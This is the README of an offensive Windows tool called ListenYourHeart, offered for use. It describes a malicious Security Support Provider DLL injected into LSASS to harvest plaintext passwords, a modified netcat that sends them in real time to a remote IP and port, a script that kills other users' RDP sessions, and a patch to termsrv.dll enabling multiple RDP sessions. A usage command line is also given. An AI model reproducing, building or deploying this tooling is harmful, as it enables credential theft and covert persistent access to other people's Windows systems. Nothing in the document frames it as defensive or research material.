## üìñ Overview  
ListenYourHeart is designed to  intercept Windows authentication credentials and exfiltrate them to a remote host in real-time. It operates as a modular framework, combining credential harvesting, data transmission, and offensive automation.

---

## üß© Core Components

### 1. **mimilib.dll** (Security Support Provider)
- **Purpose**: Acts as a Security Support Provider (SSP) to intercept authentication credentials (plaintext passwords only).
- **Mechanism**: Injects into the LSASS process and forwards captured credentials to `mefcat.exe` via a **named pipe** (`\\.\pipe\communicate`).

### 2. **mefcat.exe** (Modified Netcat)
- **Purpose**: Facilitates real-time data exfiltration.
- **Features**:
  - Communicates with `mimilib.dll` through a named pipe.
  - Uses **Windows Events** for synchronization.
  - Provides transmission to a remote host (IP/port configurable).

### 3. üîß **Offensive Scripts**
#### **KoH.bat** (King Of Hill)
  - **Function:** Terminates active RDP sessions except for the session matching the specified username.
#### **patchTermSrv.exe**
  - **Function**: Patches the `termsrv.dll` library to enable multiple RDP sessions on Windows.

## Usage
```bash
ListenYourHeart.exe <REMOTE_IP> <REMOTE_PORT> [--patch] [--koh <USERNAME>]
```
### Options
`--patch` 

Enables multi-RDP sessions on the host by applying a PowerShell script to modify termSrv.dll . 

`--koh <USERNAME>` 

Activates "King of the Hill" mode: terminates all active RDP sessions except the one associated with the specified <USERNAME> via a batch script.
